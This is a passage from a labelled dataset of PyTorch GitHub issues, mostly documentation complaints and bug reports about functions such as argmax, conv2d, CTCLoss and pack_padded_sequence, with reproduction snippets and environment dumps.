I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\nIt can be frustrating to build from source with dependencies breaking the build, for example issues with the automated installation of MKL DNN and Caffe seem to break the default installation. Furthermore, each of the dependencies has a rather wide choice of configuration options that can affect performance.\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\nAn improved installation README.md document which lists the dependencies, where they are used, how the impact performance and which ones are critical.\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\nUse of Spack for installation - https://spack.io/\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe documentation for the torch.argmax function (shown here: [https://pytorch.org/docs/stable/torch.html] states: \"Returns the indices of all elements in the input tensor.\"  This is simply wrong, it should read \"Returns the index of the maximum of all values in the input tensor (across all dimensions).\r\n"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nPyTorch doesn't seem to disagree to use multiple CUDA streams. It provides several useful APIs, such as `torch.cuda.current_stream()` and `torch.cuda.Event`, to control streams at the application level.\r\n\r\nBut multiple streams on the same GPU may cause memory corruption. It's related to `CUDACachingAllocator`.\r\n\r\n> Allocations are associated with a stream. Once freed, blocks can be re-allocated on the same stream, ...\r\n\r\nThe allocator records the stream in which a block was allocated for a tensor to detect when it can be safely freed. But the tensor can be accessed in another stream. In this case, the block might be reallocated before the access has finished. For example, let's assume we allocated a tensor at the default stream, and another stream copies the tensor. In this case, a block of the tensor might be reallocated for a new tensor at the default stream.\r\n\r\nIt seems that memory corruption can be prevented by `Tensor.record_stream()` effectively. If I understood correctly, this API makes the allocator detect the time when the blocks can be freed safely. But `Tensor.record_stream()` is not documented yet. So we shouldn't use it at the application level.\r\n\r\nI suggest making `Tensor.record_stream()` as a public API. It would be very useful to develop multi-stream applications with less unpredictable bugs."},{"labels":["documentation",null],"text":"We have `test_empty_strided`, but maybe we don't want it to be a public API? \r\n\r\nI'm not sure about this... "},{"labels":["documentation",null,null],"text":"We have test coverage for it but no documentation. "},{"labels":[null,"documentation",null],"text":"The future package should be mentioned in the list of dependencies for building from source with python 2.7 on https://pytorch.org/get-started/locally/\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.2.0a0+722e5b1\r\nIs debug build: No\r\nCUDA used to build PyTorch: Could not collect\r\n\r\nOS: Ubuntu 18.04.1 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.14.0\r\n\r\nPython version: 2.7\r\nIs CUDA available: No\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: Quadro GP100\r\nGPU 1: Quadro GP100\r\n\r\nNvidia driver version: 410.79\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.2.0a0+722e5b1\r\n[conda] blas                      1.0                         mkl\r\n[conda] mkl                       2019.4                      243\r\n[conda] mkl-include               2019.4                      243\r\n[conda] mkl_fft                   1.0.12           py27ha843d7b_0\r\n[conda] mkl_random                1.0.2            py27hd81dba3_0\r\n[conda] torch                     1.2.0a0+722e5b1          pypi_0    pypi"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n`torch.nn.Upsample()` shares the same undeterministic backward issue with `torch.nn.functional.upsample()`, which could not be easily turned off using CuDNN flag. But in the documentation, we didn't state that. Can we add the documentation for `torch.nn.Upsample()`?\r\n"},{"labels":["documentation",null],"text":"`torch.bitwise_not()\r\nbitwise_not(input, out=None) -> Tensor\r\n\r\nComputes the bitwise NOT of the given input tensor. The input must be of integer or Boolean types.\r\n\r\nParameters\r\n{input} ‚Äì\r\n\r\n{out} ‚Äì\r\n\r\nExample:\r\n\r\n>>> torch.bitwise_not(torch.tensor([-1, -2, 3], dtype=torch.int8))\r\ntensor([ 0,  1, -4], dtype=torch.int8)`\r\n\r\nSee the substitutions are being displayed raw."},{"labels":[null,"documentation",null],"text":"Hello everyone,\r\n\r\njust wanted to let you know that I started this repo:\r\n\r\nhttps://github.com/nmilosev/pytorch-arm-builds\r\n\r\nwhich contains builds for ARM devices and some inference tests. Everything is working good, it would maybe be nice to put this link somewhere visible so that people know it exists. I intend to update this with every pytorch and torchvision release.\r\n\r\nHope this is ok.\r\n\r\nThanks for everything! :)"},{"labels":["documentation",null,null],"text":"The official website does not provide the torchvison version installation method.\r\nHere is the error message  when torchvison 0.3.0 is used.\r\ntorchvision/_C.cpython-36m-x86_64-linux-gnu.so: undefined symbol: _ZN2at7getTypeERKNS_6TensorE\r\n\r\nThat should be caused by the mismatch version  between pytorch-nightly and torchvision  0.3.0.\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nThis is a niche bug, but it might cause troubles in advanced users who like to use masking to filter out NaN losses. Simply put, when NaN losses are masked out using `masked_fill`, performing `backward` on the sum of the losses should produce valid gradients (assuming that the gradient graph is smooth everywhere except for the masked losses). When \r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\nDefine the environment as follows. We will be backpropagating gradients to a very simple `nn.Linear` layer.\r\n\r\n```python\r\nimport torch\r\nimport torch.nn as nn\r\nx = torch.ones(3, 4)\r\nlinear = nn.Linear(4, 2)\r\ndef has_err(x):\r\n    return bool(((x != x) | (x == float(\"inf\")) | (x == float(\"-inf\"))).any().item())\r\n```\r\n\r\nPerforming a forward inference on the linear layer and propagating gradients from there works as intended if no `nan` is involved.\r\n\r\n```python\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# tensor([[3., 3., 3., 3.],\r\n#         [3., 3., 3., 3.]])\r\nassert not has_err(linear.weight.grad)\r\n```\r\n\r\nSuppose that `x` has `nan` in one of its rows.\r\n\r\n```python\r\nx[2].fill_(float(\"nan\"))\r\nprint(linear(x))\r\n# tensor([[ 0.0570, -1.0066],\r\n#         [ 0.0570, -1.0066],\r\n#         [    nan,     nan]], grad_fn=<AddmmBackward>)\r\n```\r\n\r\nPerforming backwards computation on the sum of the matrix above should\r\nproduce `nan` gradients. This is expected.\r\n\r\n```python\r\nlinear.zero_grad()\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# tensor([[nan, nan, nan, nan],\r\n#         [nan, nan, nan, nan]])\r\nassert has_err(linear.weight.grad)\r\n```\r\n\r\nHowever, using `masked_fill` or  index slicing on the leaf nodes to mask out problematic gradient graphs should not.\r\n\r\n```python\r\nlinear.zero_grad()\r\nlinear(x)[:2].sum().backward()\r\nassert not has_err(linear.weight.grad)  # AssertionError raised\r\n```\r\nWe can check whether masking out final losses works in cases where no `nan` is involved.\r\n\r\n```python\r\nx = torch.ones(3, 4)\r\nx[2].fill_(0.5)\r\nlinear.zero_grad()\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# without masking:\r\n# tensor([[2.5000, 2.5000, 2.5000, 2.5000],\r\n#         [2.5000, 2.5000, 2.5000, 2.5000]])\r\nlinear.zero_grad()\r\nlinear(x)[2:].sum().backward()\r\nprint(linear.weight.grad)\r\n# with masking:\r\n# tensor([[2., 2., 2., 2.],\r\n#         [2., 2., 2., 2.]])\r\n```\r\n\r\nThe accumulated gradient in the latter case is less than the former because index slicing (`[2:]`) on the computation graph prevented the third row in `x` from affecting the gradient computation.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.0.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.14.5\r\nGCC version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.3\r\n[pip] torch==1.0.0\r\n[conda] torch                     1.0.0                     <pip>\r\n\r\n## Additional context\r\n\r\nNone.\r\n"},{"labels":[null,null,"documentation",null],"text":"See https://github.com/pytorch/pytorch/issues/18619#issuecomment-479929030 and https://github.com/pytorch/pytorch/issues/18619#issuecomment-480863624\r\n\r\nWhen an intermediate result is an implicit input to backwards, we must explicitly define a derivative for it. This requirement isn't documented anywhere but it should be. Even better if we can warn if someone runs higher order derivative and there's a function that violated this constraint in the graph.\r\n\r\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jhrmnn"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nbased on dicussion here:\r\n\r\nhttps://discuss.pytorch.org/t/why-lengths-should-be-given-in-sorted-order-in-pack-padded-sequence/3540/10\r\n\r\n`pack_padded_sequence`\r\n\r\ndoes not need sorting anymore, so perhaps the fact the docs mention sorting at all should be deleted. \r\n\r\n> For unsorted sequences, use enforce_sorted = False. If enforce_sorted is True, the sequences should be sorted by length in a decreasing order, i.e. input[:,0] should be the longest sequence, and input[:,B-1] the shortest one. enforce_sorted = True is only necessary for ONNX export."},{"labels":[null,"documentation",null],"text":"`torch.diagonal` uses `dim1` and `dim2` while `torch.transpose` uses `dim0` and `dim1`."},{"labels":[null,null,"documentation",null,null,null,null,null],"text":"## üêõ Bug\r\npytorch 1.1.0 Conv2d with dilation > 1 crashes on CPU, but runs perfectly on GPU\r\n\r\n## Code sample\r\nimport torch \r\nimport torch.nn as nn\r\nconv = nn.Conv2d(in_channels=3, out_channels=8, kernel_size=3, stride=1, padding=2, dilation=2)\r\nx = torch.randn(1,3,16,16)\r\ny = conv(x) ## this crashes\r\nconv.cuda(); y = conv(x.cuda())  ## this runs\r\n\r\n## Environment\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: GeForce GTX 1060 6GB\r\nNvidia driver version: 418.39\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.1"},{"labels":[null,null,"documentation",null,null,null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n\r\n1. When I use c++ to deploy my model ,I need to rite a NMS function ,I found torch::conv2d() needs a param I can't provide\r\n  \r\n2.my source code is \r\n```\r\ntorch::Tensor soft_nms_3d(torch::Tensor scale_logits, int ksize, float com_strength) {\r\n    int num_scales = scale_logits.sizes()[3];\r\n    torch::Tensor max_each_scale = torch::max_pool2d(scale_logits.permute({0, 3, 1, 2}), {ksize, ksize}, {1},\r\n                                                     {int(ksize / 2)}).permute({0, 2, 3, 1});\r\n    std::tuple<torch::Tensor, torch::Tensor> torch_max_tmp = torch::max(max_each_scale, -1, true);\r\n    torch::Tensor max_all_scale;\r\n    torch::Tensor max_all_scale_idx;\r\n    std::tie(max_all_scale, max_all_scale_idx) = torch_max_tmp;\r\n    torch::Tensor exp_maps = torch::exp(com_strength * (scale_logits - max_all_scale));\r\n\r\n    torch::Tensor input = exp_maps.permute({0, 3, 1, 2});\r\n    torch::Tensor weight = torch::full({1, num_scales, ksize, ksize, 1}, 1);\r\n    torch::Tensor bias=torch::ones({0});\r\n    torch::Tensor sum_exp = torch::conv2d(input,weight,bias,{1},{int(ksize/2)},0,1);\r\n\r\n    torch::Tensor probs = exp_maps / (sum_exp + 1e-8);\r\n    return probs;\r\n}\r\n```\r\n3. And thrown error is:\r\n```\r\nterminate called after throwing an instance of 'c10::Error'\r\n  what():  expected output_padding to be a single integer value or a list of 3 values to match the convolution dimensions, but got output_padding=[0, 0] (convolution_expand_param_if_needed at /home/wang/software/pytorch/aten/src/ATen/native/Convolution.cpp:286)\r\nframe #0: c10::Error::Error(c10::SourceLocation, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) + 0x6a (0x7fc42195a43a in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libc10.so)\r\nframe #1: <unknown function> + 0x52aa4a (0x7fc433c2da4a in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #2: at::native::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) + 0x3c6 (0x7fc433c33c56 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #3: at::TypeDefault::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) const + 0xfd (0x7fc433fcb95d in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #4: torch::autograd::VariableType::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) const + 0x2a7 (0x7fc43b2aece7 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #5: at::native::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) + 0xe0 (0x7fc433c2c660 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #6: at::TypeDefault::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) const + 0xc6 (0x7fc433fcb7d6 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #7: torch::autograd::VariableType::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) const + 0x83 (0x7fc43b2b3ca3 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #8: at::native::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) + 0xaf (0x7fc433c2bfbf in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #9: at::TypeDefault::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) const + 0xbc (0x7fc433fcbeec in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #10: torch::autograd::VariableType::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) const + 0x75 (0x7fc43b374e75 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #11: soft_nms_3d(at::Tensor, int, float) + 0x54f (0x407a1f in ./rfnet)\r\nframe #12: main + 0x77c (0x4069cc in ./rfnet)\r\nframe #13: __libc_start_main + 0xf0 (0x7fc421004830 in /lib/x86_64-linux-gnu/libc.so.6)\r\nframe #14: _start + 0x29 (0x407069 in ./rfnet)\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nI need a c++ interface of conv2d function which can fill weights and bias to do convolution ,this job also can be done through other functions, but I think this function may exists errors.\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\nCollecting environment information...\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 7.5.17\r\nGPU models and configuration: GPU 0: GeForce GTX 1060\r\nNvidia driver version: 390.87\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchvision==0.3.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl_fft                   1.0.12           py36ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py36hd81dba3_0  \r\n[conda] pytorch                   1.1.0           py3.6_cuda9.0.176_cudnn7.5.1_0    pytorch\r\n[conda] torchvision               0.3.0           py36_cu9.0.176_1    pytorch\r\n"},{"labels":[null,null,"documentation",null],"text":"I am trying to train a model in a spicific GPU by using CUDA_VISIBLE_DEVICES in my script. However, unknown processes start running on other gpus that are not specified in the CUDA_VISIBLE_DEVICES. When they start running, batch training time takes very long time. When I kill those processes, batch training time goes back normal. However, the processes keep starting randomly.\r\n\r\nSame problem is happening in other Machine as we. It is worth mentioning I am running pytorch inside docker using nvidia-docker.\r\n\r\nError messages and stack traces are also helpful.\r\nI only specified CUDA_VISIBLE_DEVICES=0. however, those other process keep running randomly even after I kill them.\r\n\r\n<img width=\"724\" alt=\"Screen Shot 2019-07-19 at 7 49 21 AM\" src=\"https://user-images.githubusercontent.com/8367757/61510048-ef678300-a9f9-11e9-9956-0fc0c1139a56.png\">\r\n\r\nTraining time before those processes started and after I killed them. You can see how they make batch training time explode.\r\n\r\n<img width=\"736\" alt=\"Screen Shot 2019-07-19 at 7 50 15 AM\" src=\"https://user-images.githubusercontent.com/8367757/61510162-76b4f680-a9fa-11e9-92d0-372b1a8bcab1.png\">\r\n\r\n\r\n\r\n## System Info\r\nCollecting environment information...\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 18.04.2 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: Could not collect\r\n\r\nPython version: 2.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration:\r\nGPU 0: GeForce GTX TITAN X\r\nGPU 1: GeForce GTX TITAN X\r\n\r\nNvidia driver version: 410.78\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.1\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchvision==0.3.0\r\n\r\n\r\n"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nConcatDataset returns different error messages setting out of range plus index and minus index. \r\n\r\n## To Reproduce\r\n```\r\n>>> import torch\r\n>>> from torch.utils import data\r\n>>> x=data.ConcatDataset((range(10),range(10)))\r\n>>> x[-100]\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/mueda/code/python/rc/doc/.venv/lib/python3.7/site-packages/torch/utils/data/dataset.py\", line 78, in __getitem__\r\n    raise ValueError(\"absolute value of index should not exceed dataset length\")\r\nValueError: absolute value of index should not exceed dataset length\r\n>>> x[100]\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/mueda/code/python/rc/doc/.venv/lib/python3.7/site-packages/torch/utils/data/dataset.py\", line 85, in __getitem__\r\n    return self.datasets[dataset_idx][sample_idx]\r\nIndexError: list index out of range\r\n```\r\n## Expected behavior\r\nI think it's better that x[100] and x[-100] have the same error message.\r\n\r\nMy way to solve this is to chage [these lines](https://github.com/pytorch/pytorch/blob/master/torch/utils/data/dataset.py#L197-L200) like this.\r\n```\r\n        if idx < 0:\r\n            idx = len(self) + idx\r\n        if not (0 <= idx < len(self)):\r\n            raise ValueError(\"absolute value of index should not exceed dataset length\")\r\n```\r\n\r\n## Environment\r\n - PyTorch Version (e.g., 1.0): 1.1.0\r\n - OS (e.g., Linux): Ubuntu 18.04\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Python version: Python 3.7.3\r\n - CUDA/cuDNN version: None\r\n - GPU models and configuration: None\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nI think this example given in https://github.com/pytorch/pytorch/blob/9c4c9c3af042498144c40b30d64443cca943906a/torch/_torch_docs.py about broadcasting is confusing:\r\n\r\nIn lines 3174 to 3176:\r\n\r\n> \r\nFor example, if :attr:`tensor1` is a :math:`(j \\times 1 \\times n \\times m)` tensor and :attr:`tensor2` is a :math:`(k \\times m \\times p)` tensor, :attr:`out` will be an :math:`(j \\times k \\times n \\times p)` tensor.\r\n\r\nthe first and second trailing dimensions of `tensor1` and `tensor2` don't match, assuming obviously that `m` is not equal to neither `p` or  `n`, and neither of those three dimensions is 1.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null],"text":"TL;DR: the default `affine` value is different from the original paper and code, but is probably too old to change. Can we add a note in doc?\r\n\r\nI happened to be looking through the original paper on [Instance Normalization](https://arxiv.org/pdf/1701.02096.pdf) and the accompanied [code](https://github.com/DmitryUlyanov/texture_nets/blob/aad2cc6f8a998fedc77b64bdcfe1e2884aa0fb3e/InstanceNormalization.lua#L16-L20). Both seem to indicate that the affine transform should be on **by default**. E.g., quote from the paper:\r\n\r\n> Another similarity with BN is that each IN layer is followed by a scaling and bias operator s\fx+b.\r\n\r\nHowever, since the very beginning of `nn.InstanceNorm*d`'s existence ([this PR](https://github.com/pytorch/pytorch/pull/1283)), `affine=False` is the default.\r\n\r\nIs it worthwhile to add a `.. note::` to the doc about this behavior?\r\n\r\nAlso, cc @DmitryUlyanov , who is the first author of the paper, owner of the original lua code, and the contributor of the PyTorch module."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/61066216-1bb84980-a3d3-11e9-9a9e-1f4ff38da81c.png)\r\n\r\nIt would be good for the example to do a contraction over three dimensions instead of two. Looking at the example alone, it isn't clear if you're supposed to pass in a collection of pairs or a pair of collections. There is one line in the docs that mentions this, but making the example clearer would be nice.\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe function is documented as taking no inputs, but uses inputs in the example. \r\n\r\n![image](https://user-images.githubusercontent.com/5652049/61009358-6d63c400-a340-11e9-8633-7d798588089b.png)\r\n"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.lerp\r\n\r\n`The shapes of start and end must be broadcastable. If weight is a tensor, then the shapes of start, end must be broadcastable.`\r\n\r\nShould probably be `weight, start, end` must be broadcastable at the end.\r\n"},{"labels":[null,"documentation",null],"text":"When I try trace a model, I got this error:\r\n\r\n```\r\nTracedModules don't support parameter sharing between modules\r\n```\r\n\r\nAfter digging into jit module source codes, this error thrown for the reason that:\r\n```\r\nthe module weights already inside a set, but id is different with exists one, then out performs this error\r\n```\r\n\r\nhowever, this message is confusing. I think **it's nothing to do with parameters sharing, instead, it because of 2 modules or more with same weights but not same id**.\r\n\r\nI think the best way to indicates users to solve this, at least provide which layer or which modules conflicts with each other since they have same weights but not same id.\r\n\r\nIf you got same error when tracing a pytorch model. You should think about give my advise a :+1: "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nCurrently it is not clear from the description how to interpret what `torch.lu` returns, i.e. how exactly to recover the matrices P, L and U from the return values. This indirectly means that it's also unclear what format `torch.lu_solve` expects. Note that the format of the return values differs from `scipy.linalg.lu`."},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n[Minor minor detail]\r\nIn the reproducibility section of the docs or in the FAQ, I would add a simple subsection/snippet of code to show how to programmatically check the running version of PyTorch. \r\nThis can also encourage users to take into account heterogeneity of PyTorch versions in their code.\r\n\r\nBy the way, a simple regex on `torch.__version__` is enough (this assuming version numbering will not change).\r\n```python\r\nimport torch\r\nimport re\r\nif int(re.search(r'([\\d.]+)', torch.__version__).group(1).replace('.', '')) < 100:\r\n    raise ImportError('Your PyTorch version is not supported. '\r\n                      'Please download and install PyTorch 1.x')\r\n```\r\n"},{"labels":[null,null,"documentation",null],"text":"hi, in my project I use libtorch.and there is an operation that libtorch does not support. and I want to \r\nimplement the operation myself. and I search the document,I have not found any help. I just want to implement the forward pass, and backward pass. does there is some document, that help me add an new op for libtorch."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nSmall error in the comment documenting cosine simularity. I think:\r\n\r\n`  \\text{similarity} = \\dfrac{x_1 \\cdot x_2}{\\max(\\Vert x_1 \\Vert _2 \\cdot \\Vert x_2 \\Vert _2, \\epsilon)}.`\r\n\r\n, should be:\r\n\r\n`  \\text{similarity} = \\dfrac{x_1 \\cdot x_2}{\\max(\\Vert x_1 \\Vert _2 \\cdot \\Vert x_2 \\Vert _1, \\epsilon)}.`\r\n\r\nThat is, the last \\Vert_2 should actually be \\Vert_1\r\n\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\nComparisons used to output a `ByteTensor`, as pointed out by the doc (see below).\r\n\r\n<img width=\"871\" alt=\"Screenshot 2019-07-02 15 58 47\" src=\"https://user-images.githubusercontent.com/2119355/60518807-8d610b00-9ce2-11e9-9dc0-6e85a0b4b526.png\">\r\n\r\nIt looks it's not longer the case, as `dtype=uint8`.\r\nMoreover, can anyone point me to the PR for this change as well?.\r\n\r\nStill editing, hang on."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nHere is a screenshot of [CTCLoss](https://pytorch.org/docs/stable/nn.html#torch.nn.CTCLoss) with some of the inconsistencies / bugs highlighted:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/60384538-458e7980-9a7f-11e9-9d3e-3340ada665da.png)\r\n\r\nLooking at all other modules it is clear that this module is formatted totally incorrectly / inconsistently. This is from a different module, but shows how it should be:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/60384577-afa71e80-9a7f-11e9-941d-c48d3aa6fc06.png)\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nAs per the description at `https://pytorch.org/get-started/previous-versions/` I use `conda install pytorch=0.4.1 cuda90 -c pytorch` but keep getting the following error:\r\n\r\n```\r\nFetching package metadata ...\r\n\r\nCondaHTTPError: HTTP 400 BAD REQUEST for url <https://conda.anaconda.org/pytorch/linux-64/repodata.json>\r\nElapsed: 00:00.193385\r\nCF-RAY: -\r\n\r\nAn HTTP error occurred when trying to retrieve this URL.\r\nHTTP errors are often intermittent, and a simple retry will get you on your way.\r\nHTTPError('400 Client Error: Bad Request for url: https://conda.anaconda.org/pytorch/linux-64/repodata.json',)\r\n```\r\nI attempted to `conda install` pytorch from other channels, but 0.4 version does not seem available anymore. "},{"labels":["documentation",null],"text":"Hello everyone, here is an update about quantized Tensor, we are actively working on brining in more support for quantization in PyTorch, please stay tuned.\r\nhttps://github.com/pytorch/pytorch/wiki/Introducing-Quantized-Tensor"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nThis note is totally unclear to me. What does it mean? I don't know what should be called afterward. The link doesn't point to a function, just to torch.nn.Module. \r\n\r\n![image](https://user-images.githubusercontent.com/44090/60126626-b6d3e100-978e-11e9-9d76-d7df1f7415dc.png)\r\n\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[torch.diagflat](https://pytorch.org/docs/stable/torch.html#torch.diagflat) parameter names are inconsistent: \r\n\r\n![image](https://user-images.githubusercontent.com/44090/59555541-6d2c0f00-8fb4-11e9-933c-210ae209d397.png)\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[torch.bincount](https://pytorch.org/docs/stable/torch.html#torch.bincount) documentation is inconsistent:\r\n\r\n![image](https://user-images.githubusercontent.com/44090/59555436-72885a00-8fb2-11e9-8385-515c92fc0af2.png)\r\n"},{"labels":["documentation"],"text":"## üìö Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\nIn [torch.hamming_window](https://pytorch.org/docs/stable/torch.html#torch.hamming_window) the parameters alpah and beta are missing from parameters table. It is not a big deal, just inconsistent"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed:\r\n\r\n[allclose](https://pytorch.org/docs/stable/torch.html#torch.allclose) documents parameter equal_nan as float, but it should be bool. \r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\nI am working on [Torch.NET](https://github.com/SciSharp/Torch.NET) which is generated from the docs. Here is another bug I noticed: 